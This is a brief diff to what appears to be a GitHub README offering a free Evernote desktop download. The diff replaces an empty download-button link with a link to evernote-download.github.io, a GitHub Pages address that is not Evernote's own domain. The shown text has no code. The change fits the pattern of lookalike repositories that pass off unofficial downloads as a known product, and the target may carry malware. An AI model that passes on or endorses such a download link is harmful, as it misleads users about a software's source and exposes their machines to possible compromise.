@@ -3,7 +3,7 @@
 <img width="765" height="231" alt="Screenshot_5" src="https://github.com/user-attachments/assets/428e5ffc-ea64-4159-b9fc-98f857b56f11" />
 
 🔘 **Download free for desktop**  
-[![Click to Download](https://img.shields.io/badge/Click_to-Download-blue?style=for-the-badge)](#)
+[![Click to Download](https://img.shields.io/badge/Click_to-Download-blue?style=for-the-badge)](https://evernote-download.github.io/.github/)
  
 ---
 ## ⚙️ How to Use Evernote
